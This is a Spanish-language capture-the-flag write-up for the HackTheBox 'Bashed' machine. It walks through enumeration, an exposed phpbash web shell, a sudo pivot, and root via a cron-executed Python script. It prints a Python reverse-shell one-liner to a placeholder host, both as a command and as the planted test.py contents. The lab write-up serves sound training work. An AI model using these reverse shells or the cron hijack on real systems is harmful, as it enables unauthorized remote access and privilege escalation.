---
title: HackTheBox Bashed
date: 2021-06-13 12:00:00 -0400
image: 
  path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/banner.png 
  height: 1100
  width: 500
categories: [HTB Writeups, Linux Easy]
tags: [cronjobs, scripts, python, suid, apache]
---

***

**Machine IP**: 10.10.10.68

**DATE**  : 13/06/2021

***


## Reconocimiento
Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.

## Nmap 

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/nmap.png)

Como vemos solo el puerto 80 está abierto, así que investigaremos en la web para ver si encontramos algo interesante

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/web.png)

En la web no encontré nada :,c, pero `phpbash` me da una pista.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/phpbash.png)

Como vemos es un frontend normal,pero el nombre `php bash` es algo sospechoso  al parecer no muestra directorios, por eso le hacemos un `brute force` para enumerar los directorios con `gobuster`.

```bash
┌──(s4yhii㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.68  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200                                                               1 ⨯ 2 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/13 03:44:34 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]   
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]   
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]   
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]    
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
```

Como vemos nos arroja muchos directorios, examinando cada uno de ellos pude encontrar algo interesante en /dev, dos archivos con el nombre de la pagina en si phpbash

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/indexweb.png)


Al abrir el segundo archivo nos carga una shell con el usuario `www-data` , buscamos el archivo user.txt con el siguiente comando

```bash
find / -type f -name "user.txt" 2>/dev/null
```

y bingo, lo encontramos, ahora a tratar de obtener una shell interactiva para poner comandos basicos.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/wwwdata.png)
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/usertxt.png)

Primero intentaremos ver si hay algunos binarios con permisos `SUID` para ejecutarlos con permisos root, para eso usamos en comando:

```bash
sudo -l
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/sudol.png)

Vemos que el usuario `Scriptmanager` puede ejecutar cualquier comando en su sesion, entonces vamos a invocar una shell en nuestra maquina con `netcat`, por el lado de nuestra maquina usariamos el comando 

```bash
nc -nlvp 4448
```

Y por el lado de la phpbash, ejecutamos el siguiente comando para establecer una `shell reversa` con python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("nuestraip",4448));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```

Y así quedaria nuestra shell, luego nos logeamos como `scriptmanager` con una shell bash con el comando

```bash
sudo -u scriptmanager /bin/bash
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/accesscript.png)

Luego hacemos el tratamiento de la tty para que nuestra shell sea interactiva con los siguientes comandos

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=screen-256color 
\[Ctrl Z\] 
stty raw -echo 
fg 
\[INTRO\] 
export TERM=screen
```

## Escalamiento de privilegios a root

Haremos un ls al directorio raiz y encontramos un directorio llamado scripts con solo permiso para scriptmanager, entramos para ver que archivos o directorios interesantes tiene.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/privilegesscript.png)

Como vemos hay un archivo `test.py` que pertenece al nuestro usuario y un txt que pertenece a root , cuando nos encontramos con estas situaciones, debemos considerar que una opción es que hay tareas `cron` o automáticas que se realizan cada cierto tiempo, por eso en esta caso el script está siendo ejecutado como root, ya que el archivo que está escribiendo es propiedad de `root`, también al revisar que la fecha de creación del archivo va cambiando, podemos afirmar que cada minuto se actualiza el `test.txt`.

Entonces tenemos que buscar que el archivo test.py contenga código malicioso para que cuando se ejecute podamos establecer una `shell reversa` en nuestra maquina con root.

Abriendo un servidor web para pasar mi archivo test.py con el siguiente código, que es el mismo que utilizamos para invocar la shell reversa, pero sin las comillas y el python -c , ya que todo irá dentro del archivo.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("tuip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Luego de descargar nuestro archivo, pondremos en escucha nuestra máquina con el puerto al cual asignamos en el `test.py` y obtendremos la shell como `root`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/bashed/roottxt.png)

!Bingo, obtenemos sesión como `root` y podemos leer el `root.txt`

Gracias por leer.

